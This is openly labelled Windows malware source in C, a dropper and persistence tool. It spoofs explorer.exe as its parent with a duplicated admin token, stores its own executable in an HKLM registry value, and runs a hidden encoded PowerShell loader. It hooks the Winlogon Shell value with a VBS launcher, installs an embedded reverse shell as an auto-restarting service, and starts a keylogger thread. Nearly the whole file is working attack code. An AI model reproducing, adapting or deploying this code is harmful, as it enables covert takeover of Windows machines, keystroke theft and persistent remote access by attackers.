/*
Persistence mechanism and dropper
author: Bryant Chang
*/
#include <winsock2.h>
#include "libs/winkeylog.h"
#include "libs/winencode.h"
#include "libs/winvbs.h"
#include "gamble.c"
#include <windows.h>
#include <stdio.h>
#include "winconsts.h"

int isInRegistry() {
    // Checks if the current file is in the %TEMP% folder or not.
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    return (strstr(szPath, "TEMP") != NULL || strstr(szPath, PROC_NAME) != NULL);
}
void dropShell() {
    DBG("Dropped shell!");
    HRSRC res = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
    if (res == NULL) return;
    HGLOBAL data = LoadResource(NULL, res);
    void* pData = LockResource(data);
    DWORD size = SizeofResource(NULL, res);
    FILE* f = fopen(SHELL_PATH, "wb");
    if (f != NULL) {
        fwrite(pData, 1, size, f);
        fclose(f);
    }
}
void installShell() {
    DBG("Installing shell...");
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return;
    SC_HANDLE hService = CreateService(
        hSCM,
        SERVICE_NAME,
        "We're shelling it!",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        SHELL_PATH,
        NULL, NULL, NULL, NULL, NULL
    );
    if (hService) {
        SERVICE_FAILURE_ACTIONS sfa;
        SC_ACTION actions[1];
        actions[0].Type = SC_ACTION_RESTART;
        actions[0].Delay = 5000;

        sfa.dwResetPeriod = 86400;
        sfa.lpRebootMsg = NULL;
        sfa.lpCommand = NULL;
        sfa.cActions = 1;
        sfa.lpsaActions = actions;
        ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
        StartService(hService, 0, NULL);
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCM);
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    /*
    Main malware dropper functionality
    */
    DBG("MAIN is being executed!");
    if (!strstr(lpCmdLine, "-d")) {
        // Parent process spoofing explorer.exe!!!
        DBG("No deploy, so spawning elevated child process under explorer...");
        HWND hShell = GetShellWindow();
        DWORD targetPid = 0;
        // lol explorer.exe is pretty much shell
        GetWindowThreadProcessId(hShell, &targetPid);
        if (targetPid == 0) return 0;
        // Openprocess gets explorer.exe process
        HANDLE hExplorer = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        // child process will not have admin perms once spawned in explorer.exe
        // make sure to retain the admin perms so it can write to registry
        // this is done with an access token granting admin perms
        HANDLE hToken = NULL;
        HANDLE hNewToken = NULL;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
                PROCESS_INFORMATION pi = {0};
                STARTUPINFOEXA si = {0};
                SIZE_T size = 0;
                // gets the memory size needed to store 1 attribute
                InitializeProcThreadAttributeList(NULL, 1, 0, &size);
                // allocate memory for spoofing into a buffer
                si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
                // now that we have a buffer, windows can turn it into an attribute!
                InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
                // hi windows, i want my parent to be explorer.exe
                UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer, sizeof(HANDLE), NULL, NULL);
                // report the new size
                si.StartupInfo.cb = sizeof(si);
                // prepare the command...
                char szPath[MAX_PATH];
                GetModuleFileNameA(NULL, szPath, MAX_PATH);
                char cmd[MAX_PATH + 20];
                snprintf(cmd, sizeof(cmd), "\"%s\" -d", szPath);
                // use createProcessAsUserA instead of CreateProcessA
                // that way we can use the access token
                if (CreateProcessAsUserA(hNewToken, NULL, (char*)cmd, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
                    DBG("Elevated child spawned under Explorer.");
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                DeleteProcThreadAttributeList(si.lpAttributeList);
                HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
                CloseHandle(hNewToken);
            }
            CloseHandle(hToken);
        }
        CloseHandle(hExplorer);
        return 0;
    }
    char cmd[512];
	snprintf(cmd, sizeof(cmd), 
    	"$b=(Get-ItemProperty 'Registry::HKEY_LOCAL_MACHINE\\%s').DEBUG;"
    	"$p=\"$env:TEMP\\%s\";[IO.File]::WriteAllBytes($p,$b);"
    	"Start-Process $p -WindowStyle Hidden", MAIN_REGISTRY, PROC_NAME);
	const char* encodedPayload = encodeForPowerShell(cmd);
    if (isInRegistry()) {
        DBG("I am in the TEMP file! Starting threads...");
		if (!hasVBS()) { dropVBS(encodedPayload); }
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)logKey, NULL, 0, NULL);
        HANDLE hWheelThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WheelThread, NULL, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
		return 0;
	}
    DBG("I am not in the TEMP file, so I will write to registry");
    // write entire exe to registry
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    FILE* file = fopen(szPath, "rb");
    if (!file) return 0;
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    fread(buffer, 1, fileSize, file);
    fclose(file);
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, MAIN_REGISTRY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "DEBUG", 0, REG_BINARY, buffer, fileSize);
        RegCloseKey(hKey);
    }
    free(buffer);
    // create vbs and write to registry
    DBG("Dropping VBS!");
    dropVBS(encodedPayload);
    char currentShell[512], newShell[1024];
    DWORD dwSize = sizeof(currentShell);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, ACTIVATE_REGISTRY, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "Shell", NULL, NULL, (LPBYTE)currentShell, &dwSize) == ERROR_SUCCESS) {
            if (strstr(currentShell, "wininit.ini.vbs") == NULL) {
                snprintf(newShell, sizeof(newShell), "%s, wscript.exe \"%s\"", currentShell, VBS_PATH);
                RegSetValueExA(hKey, "Shell", 0, REG_SZ, (const BYTE*)newShell, strlen(newShell) + 1);
            }
        }
        RegCloseKey(hKey);
    }
    // drop reverse shell and turn it into a service
    dropShell();
    installShell();
    // dont run these if prebaked using ansible.
    // This is if you are manually running the exe file.
    //char vbscmd[MAX_PATH + 30];
    //snprintf(vbscmd, sizeof(vbscmd), "wscript.exe //B \"%s\"", VBS_PATH);
    //WinExec(vbscmd, 0);
    DBG("I ran the VBS file...");
    return 0;
}